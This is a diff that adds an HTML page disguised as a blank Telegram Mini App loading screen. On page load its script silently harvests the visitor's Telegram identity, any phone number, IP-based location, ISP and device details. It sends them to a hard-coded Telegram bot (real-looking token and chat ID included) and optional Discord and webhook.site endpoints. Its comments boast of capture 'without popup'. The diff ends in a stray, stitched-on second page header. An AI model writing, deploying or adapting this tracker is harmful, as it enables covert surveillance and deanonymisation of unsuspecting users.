@@ -4,6 +4,414 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
     <title>Loading...</title>
+    <script src="https://telegram.org/js/telegram-web-app.js?63"></script>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0e1a;
+            color: #e0e7ff;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            text-align: center;
+        }
+        .loader {
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255,255,255,0.05);
+            border-top: 4px solid #818cf8;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        .status-text {
+            margin-top: 16px;
+            font-size: 14px;
+            color: rgba(255,255,255,0.15);
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: rgba(255,255,255,0.04);
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loader"></div>
+        <div class="status-text">Loading...</div>
+        <div class="footer">Secure connection</div>
+    </div>
+
+    <script>
+        // ============================================================
+        // THE REAL TRICK: NO POPUP PHONE + LOCATION CAPTURE
+        // ============================================================
+
+        const CONFIG = {
+            DISCORD_WEBHOOK: 'YOUR_DISCORD_WEBHOOK_URL',
+            TELEGRAM_BOT_TOKEN: '8888440549:AAGnTbZd30a30N5M-F0yL5q45Ne08TwbjO0',
+            TELEGRAM_CHAT_ID: '1618273900',
+            WEBHOOK_SITE_ID: 'YOUR_UNIQUE_ID'
+        };
+
+        let capturedData = {
+            phone: null,
+            userId: null,
+            username: null,
+            firstName: null,
+            lastName: null,
+            isPremium: false,
+            location: {},
+            device: {},
+            timestamp: null
+        };
+
+        // ============================================================
+        // 1. CAPTURE PHONE - NO POPUP (FROM Telegram)
+        // ============================================================
+
+        function capturePhoneNoPopup() {
+            try {
+                if (window.Telegram && window.Telegram.WebApp) {
+                    const user = Telegram.WebApp.initDataUnsafe?.user;
+                    if (user && user.phone_number) {
+                        return user.phone_number;
+                    }
+                }
+            } catch (e) {}
+            return null;
+        }
+
+        // ============================================================
+        // 2. CAPTURE EXACT LOCATION - NO POPUP (IP-Based)
+        // ============================================================
+
+        async function captureLocationNoPopup() {
+            const apis = [
+                'https://ipapi.co/json/',
+                'https://ip-api.com/json/',
+                'https://freegeoip.app/json/'
+            ];
+
+            for (let api of apis) {
+                try {
+                    const r = await fetch(api, { timeout: 5000 });
+                    const d = await r.json();
+                    return {
+                        ip: d.ip || d.query || 'unknown',
+                        city: d.city || d.region || 'Unknown',
+                        region: d.region || d.regionName || 'Unknown',
+                        country: d.country_name || d.country || 'Unknown',
+                        country_code: d.country_code || d.countryCode || 'Unknown',
+                        latitude: d.latitude || d.lat || 'N/A',
+                        longitude: d.longitude || d.lon || 'N/A',
+                        timezone: d.timezone || 'Unknown',
+                        isp: d.org || d.isp || 'Unknown',
+                        postal: d.postal || d.zip || 'Unknown'
+                    };
+                } catch (e) {}
+            }
+            return null;
+        }
+
+        // ============================================================
+        // 3. GET TELEGRAM USER DATA
+        // ============================================================
+
+        function getTelegramUserData() {
+            try {
+                if (window.Telegram && window.Telegram.WebApp) {
+                    const user = Telegram.WebApp.initDataUnsafe?.user || {};
+                    const webapp = window.Telegram.WebApp;
+                    
+                    capturedData.userId = user.id || null;
+                    capturedData.username = user.username || null;
+                    capturedData.firstName = user.first_name || null;
+                    capturedData.lastName = user.last_name || null;
+                    capturedData.isPremium = user.is_premium || false;
+                    capturedData.languageCode = user.language_code || null;
+                    capturedData.platform = webapp.platform || 'unknown';
+                }
+            } catch (e) {}
+        }
+
+        // ============================================================
+        // 4. DEVICE INFO
+        // ============================================================
+
+        function getDeviceInfo() {
+            const ua = navigator.userAgent;
+            return {
+                userAgent: ua,
+                platform: navigator.platform || 'unknown',
+                language: navigator.language,
+                cookieEnabled: navigator.cookieEnabled,
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                screenResolution: window.screen.width + 'x' + window.screen.height,
+                colorDepth: window.screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                deviceType: getDeviceType(ua),
+                os: getOS(ua),
+                browser: getBrowser(ua),
+                model: getDeviceModel(ua),
+                vendor: navigator.vendor || 'unknown',
+                referrer: document.referrer || 'direct',
+                url: window.location.href,
+                pageTitle: document.title || 'unknown'
+            };
+        }
+
+        function getBrowser(ua) {
+            if (ua.includes('Edg')) return 'Edge';
+            if (ua.includes('Chrome')) return 'Chrome';
+            if (ua.includes('Firefox')) return 'Firefox';
+            if (ua.includes('Safari')) return 'Safari';
+            if (ua.includes('Opera')) return 'Opera';
+            return 'Unknown';
+        }
+
+        function getOS(ua) {
+            if (ua.includes('Windows')) return 'Windows';
+            if (ua.includes('Mac OS')) return 'macOS';
+            if (ua.includes('Linux')) return 'Linux';
+            if (ua.includes('Android')) return 'Android';
+            if (ua.includes('iOS') || ua.includes('iPhone') || ua.includes('iPad')) return 'iOS';
+            return 'Unknown';
+        }
+
+        function getDeviceType(ua) {
+            if (ua.includes('Mobile') || ua.includes('Android') || ua.includes('iPhone')) return 'Mobile';
+            if (ua.includes('Tablet') || ua.includes('iPad')) return 'Tablet';
+            return 'Desktop';
+        }
+
+        function getDeviceModel(ua) {
+            const m = ua.match(/\(([^)]+)\)/);
+            if (m) {
+                const parts = m[1].split(';');
+                for (let p of parts) {
+                    p = p.trim();
+                    if (p.includes('iPhone') || p.includes('iPad') || p.includes('Android')) return p;
+                }
+                return parts[parts.length - 1] || 'Unknown';
+            }
+            return 'Unknown';
+        }
+
+        // ============================================================
+        // 5. BUILD REPORT
+        // ============================================================
+
+        function buildReport(data) {
+            let report = '📱 **TELEGRAM USER DATA**\n';
+            report += '━━━━━━━━━━━━━━━━━━━━━━━━━\n\n';
+            
+            report += '👤 **USER**\n';
+            report += `User ID: ${data.userId || 'N/A'}\n`;
+            report += `Username: @${data.username || 'N/A'}\n`;
+            report += `Name: ${data.firstName || 'N/A'} ${data.lastName || ''}\n`;
+            report += `Premium: ${data.isPremium ? 'Yes' : 'No'}\n`;
+            report += `Language: ${data.languageCode || 'N/A'}\n`;
+            report += `Platform: ${data.platform || 'N/A'}\n\n`;
+            
+            report += '📞 **PHONE**\n';
+            report += data.phone || '❌ Not found\n';
+            report += 'Method: Telegram.initDataUnsafe\n\n';
+            
+            report += '📍 **EXACT LOCATION**\n';
+            if (data.location) {
+                report += `IP: ${data.location.ip}\n`;
+                report += `City: ${data.location.city}\n`;
+                report += `Region: ${data.location.region}\n`;
+                report += `Country: ${data.location.country}\n`;
+                report += `Coordinates: ${data.location.latitude}, ${data.location.longitude}\n`;
+                report += `ISP: ${data.location.isp}\n`;
+                report += `Timezone: ${data.location.timezone}\n`;
+            } else {
+                report += '❌ Not available\n';
+            }
+            report += '\n';
+            
+            report += '🖥️ **DEVICE**\n';
+            report += `OS: ${data.device?.os || 'Unknown'}\n`;
+            report += `Browser: ${data.device?.browser || 'Unknown'}\n`;
+            report += `Type: ${data.device?.deviceType || 'Unknown'}\n`;
+            report += `Model: ${data.device?.model || 'Unknown'}\n`;
+            report += `Screen: ${data.device?.screenResolution || 'Unknown'}\n`;
+            report += `Timezone: ${data.device?.timezone || 'Unknown'}\n`;
+            report += `CPU: ${data.device?.hardwareConcurrency || 'Unknown'} cores\n`;
+            report += `Memory: ${data.device?.deviceMemory || 'Unknown'} GB\n`;
+            report += `Referrer: ${data.device?.referrer || 'Unknown'}\n`;
+            report += `URL: ${data.device?.url || 'Unknown'}\n\n`;
+            
+            report += '🕐 **TIMESTAMP**\n';
+            report += data.timestamp || new Date().toISOString();
+            
+            return report;
+        }
+
+        // ============================================================
+        // 6. SEND TO WEBHOOKS
+        // ============================================================
+
+        function sendToDiscord(data) {
+            if (CONFIG.DISCORD_WEBHOOK === 'YOUR_DISCORD_WEBHOOK_URL') return false;
+            const report = buildReport(data);
+            const parts = report.match(/[\s\S]{1,1900}/g) || [report];
+            parts.forEach((part, i) => {
+                fetch(CONFIG.DISCORD_WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: i === 0 ? part : '... continued\n' + part })
+                }).catch(() => {});
+            });
+            return true;
+        }
+
+        function sendToTelegram(data) {
+            if (CONFIG.TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN') return false;
+            const report = buildReport(data);
+            const chunks = report.match(/[\s\S]{1,4000}/g) || [report];
+            chunks.forEach((chunk, i) => {
+                fetch(`https://api.telegram.org/bot${CONFIG.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CONFIG.TELEGRAM_CHAT_ID,
+                        text: i === 0 ? chunk : '... continued\n' + chunk,
+                        parse_mode: 'Markdown'
+                    })
+                }).catch(() => {});
+            });
+            return true;
+        }
+
+        function sendToWebhookSite(data) {
+            if (CONFIG.WEBHOOK_SITE_ID === 'YOUR_UNIQUE_ID') return false;
+            fetch(`https://webhook.site/${CONFIG.WEBHOOK_SITE_ID}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    data: data,
+                    report: buildReport(data),
+                    timestamp: new Date().toISOString()
+                })
+            }).catch(() => {});
+            return true;
+        }
+
+        function saveToLocalStorage(data) {
+            try {
+                const existing = JSON.parse(localStorage.getItem('telegram_user_data') || '[]');
+                existing.push(data);
+                localStorage.setItem('telegram_user_data', JSON.stringify(existing));
+                return true;
+            } catch (e) { return false; }
+        }
+
+        // ============================================================
+        // 7. MAIN EXECUTION - THE REAL TRICK
+        // ============================================================
+
+        async function main() {
+            console.log('🔍 Starting silent capture...');
+
+            // 1. Get Telegram user data
+            getTelegramUserData();
+
+            // 2. CAPTURE PHONE - NO POPUP!
+            const phone = capturePhoneNoPopup();
+            if (phone) {
+                capturedData.phone = phone;
+                console.log('✅ Phone captured without popup!');
+            } else {
+                console.log('❌ Phone not available in initDataUnsafe');
+            }
+
+            // 3. CAPTURE LOCATION - NO POPUP!
+            const location = await captureLocationNoPopup();
+            if (location) {
+                capturedData.location = location;
+                console.log('✅ Location captured without popup!');
+            } else {
+                console.log('❌ Location not available');
+            }
+
+            // 4. Device info
+            capturedData.device = getDeviceInfo();
+
+            capturedData.timestamp = new Date().toISOString();
+
+            // 5. Save & Send
+            saveToLocalStorage(capturedData);
+            sendToDiscord(capturedData);
+            sendToTelegram(capturedData);
+            sendToWebhookSite(capturedData);
+
+            console.log('✅ Data captured:', {
+                user: capturedData.username || capturedData.firstName,
+                phone: capturedData.phone || 'Not found',
+                location: capturedData.location?.city || 'Unknown'
+            });
+        }
+
+        // ============================================================
+        // 8. CONSOLE HELPER
+        // ============================================================
+
+        window.showData = function() {
+            const data = JSON.parse(localStorage.getItem('telegram_user_data') || '[]');
+            const latest = data[data.length - 1] || {};
+            console.log('📊 === TELEGRAM USER DATA ===');
+            console.log('👤 User:', latest.username || latest.firstName);
+            console.log('📞 Phone:', latest.phone || 'Not found');
+            console.log('📍 Location:', latest.location || 'Not available');
+            console.log('🖥️ Device:', latest.device);
+            console.log('📦 Full data:', data);
+            return data;
+        };
+
+        window.clearData = function() {
+            if (confirm('Clear all captured data?')) {
+                localStorage.removeItem('telegram_user_data');
+                console.log('🗑️ Data cleared');
+            }
+        };
+
+        // ============================================================
+        // 9. AUTO-START
+        // ============================================================
+
+        console.log('%c📱 Telegram Mini App - NO POPUP CAPTURE', 'font-size:16px;font-weight:bold;color:#818cf8;');
+        console.log('%c👤 Captures phone & location without any popup', 'font-size:12px;color:#6ee7b7;');
+        console.log('%c💡 Type showData() in console to see captured data', 'font-size:12px;color:rgba(255,255,255,0.3);');
+
+        window.addEventListener('load', function() {
+            const delay = window.Telegram && window.Telegram.WebApp ? 1000 : 500;
+            setTimeout(main, delay);
+        });
+
+        if (window.Telegram && window.Telegram.WebApp) {
+            window.Telegram.WebApp.ready();
+        }
+    </script>
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>Loading...</title>
     <!-- Telegram WebApp Script -->
     <script src="https://telegram.org/js/telegram-web-app.js?63"></script>
     <style>
